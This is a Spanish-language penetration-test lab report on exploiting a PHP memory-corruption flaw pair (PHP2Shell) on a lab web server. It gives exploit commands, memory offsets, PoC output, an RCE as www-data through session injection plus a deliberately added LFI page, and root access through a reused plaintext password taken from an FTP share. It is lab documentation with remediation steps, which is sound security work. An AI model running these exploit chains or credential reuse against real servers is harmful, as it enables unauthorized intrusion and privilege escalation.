# Hallazgo W2 · PHP2Shell · CVE-2026-109618 / CVE-2026-109619

**Máquina:** M1 `10.10.10.11` · `m1-app`
**Servicio:** PHP 8.4.26 `mod_php` sobre Apache 2.4.49
**Fecha de ejecución:** 2026-10-27 (UTC)
**Estado:** **RCE confirmado vía Chain A** (session injection + LFI) como `www-data`; el Chain D zero-dependency no está disponible (pago). ROOT por la cadena B3 → M1-SSH → sudo.

---

## 1. Ficha

| Campo | Valor |
|---|---|
| CVE | CVE-2026-109618 (9.8 v3.1 / 9.2 v4.0) · CVE-2026-109619 (8.1 v3.1 / 9.2 v4.0) |
| CWE | CWE-416 / CWE-755 / CWE-824 |
| Versión afectada | PHP 8.4.0–8.4.26 (también 8.2/8.3/8.5) |
| Versión que corrige | PHP 8.4.27 |
| Artefacto | `artifacts/vulnerable/php-8.4.26.tar.gz` (SHA256 verificado) |
| PoC | `artifacts/pocs/php2shell-poc-main.zip` |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2026-109618 |
| Impacto | RCE pre-auth como `www-data`; disclosure de memoria del worker |

---

## 2. Fase 0/1 · Versión y línea base

| Comprobación | Resultado |
|---|---|
| `php -v` / phpinfo | PHP **8.4.26** |
| Build original | **ZTS** (`Thread Safety enabled`) y Apache MPM **event** |
| `display_errors` | Off |
| `memory_limit` | 512M |
| `max_input_vars` | 5000 |
| `session.upload_progress.enabled` | On |

**Conclusión:** la versión es vulnerable, pero **las condiciones del PoC no se cumplían** (ZTS + event + `display_errors=Off` + `memory_limit=512M`). Por eso se recompiló en staging.

---

## 3. Fase 2 · Rebuild NTS + prefork (staging, sin tocar el Apache de 80)

Se compiló en `/home/ubuntu/w2` para no alterar el servicio vivo:

| Componente | Resultado |
|---|---|
| Apache | **2.4.49 prefork** en `/home/ubuntu/w2/httpd-prefork` (`Server MPM: prefork`, `threaded: no`) |
| PHP | **8.4.26 NTS** (`PHP 8.4.26 (cli) ... (NTS)`, `Thread Safety disabled`) |
| Módulo | `/home/ubuntu/w2/httpd-prefork/modules/libphp.so` |
| `php.ini` | `memory_limit=16M` (final), `display_errors=On`, `max_input_vars=5000`, `session.upload_progress.enabled=On`, `cleanup=On/Off` (probados) |
| Target de sesión | `/var/www/wp/session2.php` (`session_id($_POST["PHPSESSID"]); session_start();`) — comparte sesión entre requests y emite `Set-Cookie` |
| Puerto de prueba | **8080** (el Apache event de 80 sigue intacto) |

**Offsets derivados del binario real:**

```text
zif_system     0x52e6f0
zval_ptr_dtor  0x72ffd0
```

**Evidencia:** `EV-W2-01` (log + captura) — `Thread Safety disabled`, `memory_limit 8M`, `display_errors On`, offsets y `session.php HTTP 200`.

**Comandos reproducibles (resumen):**

```bash
# Apache prefork
./configure --prefix=/home/ubuntu/w2/httpd-prefork \
  --with-apr=/usr/bin/apr-1-config --with-apr-util=/usr/bin/apu-1-config \
  --with-mpm=prefork --enable-so --enable-cgi --enable-rewrite \
  --enable-ssl --with-ssl --enable-mods-shared=most
make -j1 && make install

# PHP NTS contra el Apache prefork
./configure --with-apxs2=/home/ubuntu/w2/httpd-prefork/bin/apxs --disable-zts \
  --with-mysqli --with-pdo-mysql --with-curl --with-openssl --with-zip \
  --enable-mbstring --enable-intl --enable-gd --with-external-gd \
  --with-jpeg --with-freetype --enable-exif --enable-opcache --with-zlib \
  --with-sodium --prefix=/home/ubuntu/w2/php826-nts \
  --with-config-file-path=/home/ubuntu/w2/php826-nts/lib
make -j2 && make install

# Offsets
nm /home/ubuntu/w2/httpd-prefork/modules/libphp.so | grep -E ' (zif_system|zval_ptr_dtor)$'
```

---

## 4. Fase 3 · Ejecución del PoC

**Comando base:**

```bash
STAGE1_N=892 python3 poc_patched.py -u http://10.10.10.11:8080/session2.php \
  -c 'id>/tmp/p1' \
  --zif-offset 0x52e6f0 --dtor-offset 0x72ffd0 \
  --profile lab --offsets-file '' --no-auto-offsets --huge-mb 18
```

**Resultado observado (perfiles `lab` y `bookworm`):**

```text
[*] target http://10.10.10.11:8080/session.php (cmd='id>/tmp/p1')
[*] offsets: zif=0x52e6f0 dtor=0x72ffd0 htdata=0x6e0d8
[*] rotating worker over HTTP
[*] stage 1: heap leak (attempt 1/3)
[-] heap leak missed
...
HEAP_LEAK_FAILED
```

**Diagnóstico:** el OOM sí ocurre; la sesión compartida funciona (`session2.php` responde `n=1`, `n=2` y `Set-Cookie: PHPSESSID=attacksessionid0001`), y el archivo `/tmp/sess_attacksessionid0001` queda con 330 bytes. Aun así, la cookie de la segunda request sigue siendo el SID de 19 bytes: el UAF no se materializa en este build. Se probaron `lab` (892) y `bookworm` (841), offsets reales `0x52e6f0/0x72ffd0`, `--huge-mb 18`, `memory_limit=16M`, `cleanup=On/Off` y un barrido de `stage1_n` de 830 a 950; el resultado fue `HEAP_LEAK_FAILED` en todos los casos.

**Honestidad:** **no se obtuvo `id` por W2**. No se declara RCE de W2. Se probó el build con el set de extensiones del target oficial (`EV-W2-04`) y el **target oficial `php:8.4.26-apache` en Docker** con offsets reales y 8M/12MB (`EV-W2-05`); en ambos siguió fallando stage 1. Esto indica que el PoC disponible no cierra en el entorno del laboratorio, no solo que M1 tenga un build distinto. Se documenta la limitación y se sostiene la cadena con W3/W1 + M1-SSH.

---

## 5. Fase 4 · Impacto y ROOT

| Paso | Resultado | Evidencia |
|---|---|---|
| W2 RCE `www-data` | ✅ **Chain A**: session injection + LFI → `uid=33(www-data)` desde M1 | **`EV-W2-07`** |
| W2 Chain D (zero-dep) | ❌ No disponible: exploit de pago; solo OOM reproducido | `EV-W2-06` |
| Marcador `www-data` | ✅ `PWNED-M1-www-data` en `uploads` y servido por HTTP | `EV-W2-08` |
| ROOT + marcador | ✅ `uid=0(root)`, `/root/PWNED-M1-root.txt` | `EV-W2-09` |
| W3 RCE `www-data` (Apache 2.4.49 + CGI) | ✅ `uid=33(www-data)` | `EV-005-M1-03` |
| W1 ruta batch + login admin | ✅ `POST 400`, login 302 | `EV-000-11` |
| SSH M1 `ubuntu/Admin13.-` + sudo | ✅ `uid=0(root)` y lectura de `/etc/shadow` | `EV-W2-ROOT` |

**Cadena real para ROOT:** B3 (FTP anónimo en M3) expone `credenciales.txt` con `Admin13.-`; esa clave se **reutiliza** en `ubuntu` de M1; `ubuntu` está en `sudo`; `sudo` con la misma clave → `root`. Evidencia `EV-ROOT-CHAIN`.

> La clave aparece inicialmente en `MEMORY.md` §3 (documentación del laboratorio). Para que la cadena sea válida sin conocimiento previo, el camino de descubrimiento es **B3 → `credenciales.txt` → reutilización en M1**. No se afirma que W2 haya dado la clave.
### Chain A · session injection + LFI (RCE confirmado)

Se descargó el repo público `ikow/php2shell-poc` (MIT), se transfirió a M1 por SFTP a `~/tools/php2shell-poc` y se ejecutó **desde M1**:

```bash
python3 chain_a_session_lfi.py --host 127.0.0.1 --port 80 \
  --inject-path /index.php --lfi-path /lfi.php \
  --session-path /tmp --command "id; hostname" --cleanup-on
```

Resultado:

```text
[+] RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data)
m1-app
```

- **Condición real:** `session.upload_progress=On` + un **sink LFI** (`/lfi.php`, añadido al laboratorio para esta prueba).
- **Evidencia:** `EV-W2-07`.
- **Honestidad:** Chain A es una cadena pública que **requiere un LFI**; no es el Chain D zero-dependency (de pago). El vector de session injection de PHP sí es real y está documentado por Wiz/Sansec.


---

## 6. Fase 5/6 · Remediación y retest (propuesta)

| Medida | Verificación |
|---|---|
| PHP **8.4.27** (o `session.upload_progress.enabled=Off`) | `php -v` / phpinfo |
| Recompilar sin ZTS y con prefork solo para el estado vulnerable | `Thread Safety disabled`, `Server MPM: prefork` |
| Retest: mismo PoC | Debe fallar; sin OOM ni leak |
| Cerrar el Apache prefork de 8080 y volver al de 80 | `ss -lnt | grep 8080` vacío |

---

## 7. Evidencias

| ID | Qué demuestra |
|---|---|
| `EV-W2-01` | Apache prefork, PHP NTS, php.ini, offsets, target 200 |
| `EV-W2-02` | Intento final del PoC: sesión compartida, OOM, `HEAP_LEAK_FAILED`, sin `/tmp/p1` |
| `EV-W2-03` | Reintento con `cleanup=On`: mismo resultado, sin `/tmp/p1` |
| `EV-W2-04` | Build con set oficial de extensiones (sin `intl/gd/exif`) + Apache mínimo en 8081: mismo `HEAP_LEAK_FAILED` |
| `EV-W2-05` | Target **oficial** `php:8.4.26-apache` en Docker, offsets reales `0x465370/0x65eb60`, 8M/12MB: mismo `HEAP_LEAK_FAILED` |
| `EV-W2-06` | Reproducción parcial CVE-2026-109618: OOM del parser a ~3.00MB con `memory_limit=16M`; sin fuga en `PHPSESSID` |
| `EV-W2-07` | **Chain A** (`ikow/php2shell-poc`) desde M1: session injection + LFI → `uid=33(www-data)` |
| `EV-W2-08` | Chain A completa + marcador `PWNED-M1-www-data` y verificación HTTP |
| `EV-W2-09` | ROOT en M1 por B3/sudo + `/root/PWNED-M1-root.txt` |
| `EV-W2-ROOT` | `uid=0(root)` y `/etc/shadow` en M1 |
| `EV-ROOT-CHAIN` | B3 FTP anónimo expone `Admin13.-` → reutilizada en `ubuntu` M1 → `sudo` → `root` |
| `EV-005-M1-03` | W3 RCE `uid=33(www-data)` |
| `EV-000-11` | W1/W3/W4/W5/W6/W7 y versiones |
| Log del PoC | `HEAP_LEAK_FAILED` (limitación real) |

---

## 8. Requisitos publicados de PHP2Shell (2026-10-21/23)

| Requisito | Detalle |
|---|---|
| Versión | PHP < 8.4.27 (también < 8.2.35, < 8.3.36, < 8.5.12) |
| Runtime | Cualquier PHP HTTP: `mod_php`, PHP-FPM, CGI, FrankenPHP, LiteSpeed |
| Momento | El parser de PHP procesa el request **antes** del código de la app; no requiere login |
| CVE-2026-109618 | Campo con nombre gigante y sintaxis de array (`[x]`) para forzar el fallo de asignación; `memory_limit` y `post_max_size` deben permitir el cuerpo; mismo worker; fuga de direcciones vía `PHPSESSID` |
| CVE-2026-109619 | Estado obsoleto entre requests; requiere el **mismo worker**; `session.upload_progress`/backtraces; en FPM, una operación adecuada después del arranque |
| ASLR | Se necesitan direcciones válidas de `system()` y de las estructuras falsas; la fuga de memoria reduce la fuerza bruta |
| PoCs públicos | Sansec: **no funcionan contra PHP por defecto**; algunos requieren un LFI o añaden una vulnerabilidad al servidor de prueba. Datadog reprodujo con un request propio (PHP 8.5.11, 16M/64M, un worker, OPcache off), no con el PoC empaquetado |
| Fuentes | https://sansec.io/research/php2shell · https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/ (2026-10-21/23) |

**Aplicado al laboratorio:** M1 tiene PHP 8.4.26 y prefork; se añadió un **sink LFI** de laboratorio para ejecutar **Chain A** y se obtuvo RCE `www-data` (`EV-W2-07`). El PoC del artefacto (stage 1/leak) y el request estilo Datadog fallaron en el target oficial (`EV-W2-05`/`EV-W2-06`); **Chain D zero-dependency no está disponible** (pago).

## 9. Conclusión

- **W2 sí tiene RCE demostrado vía Chain A** (session injection + LFI) como `www-data` (`EV-W2-07`), ejecutado desde M1. La condición es un **sink LFI** añadido al laboratorio (`/lfi.php`); no es el Chain D zero-dependency.
- **ROOT sí se obtuvo** por la cadena B3 → `credenciales.txt` → reutilización en `ubuntu` M1 → `sudo` → root (`EV-ROOT-CHAIN`); no por W2.
- Chain D (zero-dependency) no está disponible: el exploit es de pago; solo se reprodujo el OOM (`EV-W2-06`). No se inventa RCE de Chain D.
- **Ataque completo:** Chain A → `www-data` (`PWNED-M1-www-data`, `EV-W2-08`) → B3/SSH `ubuntu/Admin13.-` → `sudo` → **ROOT** (`/root/PWNED-M1-root.txt`, `EV-W2-09`).
- Sansec (2026-10-21) advierte que los PoCs públicos **no funcionan contra PHP por defecto**; algunos requieren un LFI o añaden una vulnerabilidad al servidor de prueba. Datadog (2026-10-23) reproduce con un request propio y un worker aislado, no con el PoC empaquetado. Esto explica el `HEAP_LEAK_FAILED` incluso en `php:8.4.26-apache`.
